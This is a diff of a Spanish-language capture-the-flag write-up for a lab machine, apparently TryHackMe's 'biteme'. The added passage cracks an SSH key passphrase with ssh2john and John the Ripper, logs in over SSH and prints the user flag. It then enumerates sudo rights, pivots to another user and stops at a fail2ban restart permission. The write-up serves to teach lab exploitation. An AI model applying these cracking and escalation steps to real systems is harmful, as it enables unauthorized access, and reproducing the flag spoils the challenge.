@@ -151,7 +151,7 @@ Enunciado :
 
               return substr($hash, -3) === '001';} --> Obtiene los tres ultimos digitos del hash md5 y los comparata tanto en valor como tipo con el string '001'
                                                         
-          Por lo que necesitamos una pass que al calcularle su hash md5 los 3 ultimos digitos sea un string con el valor '001', para automatizar el proceso vamos a realizar un script en python y utilizar             como diccionario de claves rockyou.txt
+          Por lo que necesitamos una pass que al calcularle su hash md5 los 3 ultimos digitos sea un string con el valor '001', para automatizar el proceso vamos a realizar un script en python y utilizar como diccionario de claves rockyou.txt
 
           ![image](https://github.com/Esevka/CTF/assets/139042999/f72bfe58-cd29-4d27-83ee-7b9f32813107)
      
@@ -250,6 +250,73 @@ Enunciado :
 
       Vamos a intentar crakear la id_rsa para conseguir la clave
 
+        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
+        └─# ssh2john id_rsa > john_idrsa  
+
+        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
+        └─# john john_idrsa --wordlist=/usr/share/wordlists/rockyou.txt
+        Using default input encoding: UTF-8
+        Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+        No password hashes left to crack (see FAQ)
+                                                                                                                                                            
+        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
+        └─# john john_idrsa --show                                     
+        id_rsa:1a2b3c4d --------------------------> clave obtenida.
+        
+        1 password hash cracked, 0 left
+
+-Nos conectamos por ssh utilizando la id_rsa y la pass obtenida
+
+    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
+    └─# ssh jason@10.10.191.13 -i id_rsa                           
+    Enter passphrase for key 'id_rsa': 
+    Last login: Fri Mar  4 18:22:12 2022 from 10.0.2.2
+    jason@biteme:~$ 
+
+
+## Postexplotacion, obtencion de flags y elevacion de privilegios.
+
+-Obtenemos la flag de usuario
+
+    jason@biteme:~$ cat user.txt 
+    THM{6fbf1fb7241dac060cd3abba70c33070}
+
+-Listamos los permisos que tenemos sobre los comandos que podemos ejecutar con privilegios elevados en el sistema.
+
+  Como vemos podemos ejecutar comandos sin necesidad de clave como el usuario fred
+
+    jason@biteme:~$ sudo -l
+    Matching Defaults entries for jason on biteme:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    
+    User jason may run the following commands on biteme:
+        (ALL : ALL) ALL
+        (fred) NOPASSWD: ALL
+
+-Escalamos hozintalmente hacia el usuario fred, listamos los permisos que tenemos sobre los comandos que podemos ejecutar con privilegios elevados en el sistema.
+
+    jason@biteme:~$ sudo -u fred /bin/bash
+
+    
+    fred@biteme:~$ sudo -l
+    Matching Defaults entries for fred on biteme:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    
+    User fred may run the following commands on biteme:
+        (root) NOPASSWD: /bin/systemctl restart fail2ban
+
+-Como vemos tenemos permisos elevados para reiniciar el servicio fail2ban
+
+    Que es Fail2ban es una aplicación escrita en Python para la prevención de intrusos en un sistema, que actúa 
+    penalizando o bloqueando las conexiones remotas que intentan accesos por fuerza bruta. Se distribuye bajo 
+    licencia GNU y típicamente funciona en sistemas POSIX que tengan interfaz con un sistema de control de paquetes
+    o un firewall local (como iptables o TCP Wrapper)
+
+  
+    
+
+
+  
 
   
 
